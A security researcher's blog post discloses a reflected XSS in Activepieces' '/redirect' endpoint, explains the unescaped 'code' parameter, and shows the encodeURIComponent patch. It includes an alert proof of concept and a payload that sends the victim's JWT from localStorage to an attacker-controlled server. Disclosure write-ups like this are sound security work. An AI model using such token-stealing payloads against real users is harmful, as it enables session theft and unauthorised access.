---
layout: default
title:  "XSS on Steroids | Gaining Unauthenticated Access"
date:   2023-04-10 11:12:00 -0500
categories: jekyll update
templateEngineOverride: md
permalink: /bloghub/xss-on-steroids/
---

{% raw %} 

# XSS on Steroids | Gaining Unauthenticated Access

[Activepieces](https://www.activepieces.com/) is an open-source business automation tool, aka the open-source alternative for *Zapier,* which helps individuals automate flows and their work in a flexible UI environment without the need to write code, for example, you can build automation with *Activepieces* to send a Slack notification for each new Trello card.  

In my effort to help the open-source world enhance its security posture, I decided to do vulnerability research, meanwhile testing, I identified a reflected XSS that helps unauthenticated attackers gain access by inducing victims to click on the specially crafted link. 

Following this article, we are going to explore the technical details of the vulnerability, exploit it, and showcase how it was mitigated. 

## Impact

Versions prior to `0.3.7` are vulnerable to **Reflected XSS,** which leverages unauthenticated attackers to gain access and possibly steal credentials for added pieces and flows.

## Deep Dive

The application is written with TypeScript which is a Typed JavaScript framework. The [application](https://github.com/activepieces/activepieces) separates frontend and backend code in separate folders inside the **packages** directory.

```html
$> tree packages -L 1
packages
├── backend
├── ee
├── engine
├── frontend
├── pieces
└── shared
```

Moreover, the backend structure looks as follows, where it’s pretty obvious where the backend code and unit tests are reside.

```html
$> tree packages/backend -L 2 
├── jest.config.ts
├── project.json
├── src
│   ├── app
│   ├── assets
│   └── main.ts
├── test
│   ├── resources
│   └── workers
├── tsconfig.app.json
├── tsconfig.json
├── tsconfig.spec.json
├── types
│   ├── fastify.d.ts
│   └── redis-lock.d.ts
└── webpack.config.js
```

Reviewing `main.ts` which from its name indicates the main function and application starter, indeed, we can see the starter function at the end of the file.

**activepieces/packages/backend/src/main.ts**

```jsx
const start = async () => {
try {
	.... 
	await app.listen({
            host: "0.0.0.0",
            port: 3000, 
				}); 
	}
}
```

the app object defines an interesting route `/redirect` that accepts user input from the *code* parameter. 

**activepieces/packages/backend/src/main.ts**

```jsx
app.get(
    "/redirect",
    async (
        request: FastifyRequest<{ Querystring: { code: string; } }>, reply
    ) => {
        const params = {
            "code": request.query.code
        };
        if (params.code === undefined) {
            reply.send("The code is missing in url");
        }
        else {
            reply.type('text/html').send(`<script>if(window.opener){window.opener.postMessage({ 'code': '${params['code']}' },'*')}</script> <html>Redirect succuesfully, this window should close now</html>`)
        }
    }
);
```

As we can see, when the *code* parameter is set, the code flows to the *else* branch and returns an HTML containing the user input passed as a parameter to the *window.opener.postMessage(),* the parameter misses sanitization such as HTML encoding or URL encoding before it's reflected in the browser. 

Crafting a payload that closes the called function following it with our payload will eventually look as follows:

```
test' },'*')} else alert('poc');//
```

 This can be also leveraged to steal the JWT token of the authenticated token:

```
test' },'*')} else { const xhr = new XMLHttpRequest();xhr.open('GET', '[https://](https://enxwjqx3bxw4.x.pipedream.net/)<your server>' + localStorage.getItem('token'));xhr.send(); }//
```

### Patch

The vulnerability was mitigated by passing the *params[’code’]* to `encodeURIComponent()` 

```jsx
else {
 reply.type('text/html').send(`<script>if(window.opener){window.opener.postMessage({ 'code': '${encodeURIComponent(params['code'])}' },'*')}</script> <html>Redirect succuesfully, this window should close now</html>`)
      }
```


{% endraw %}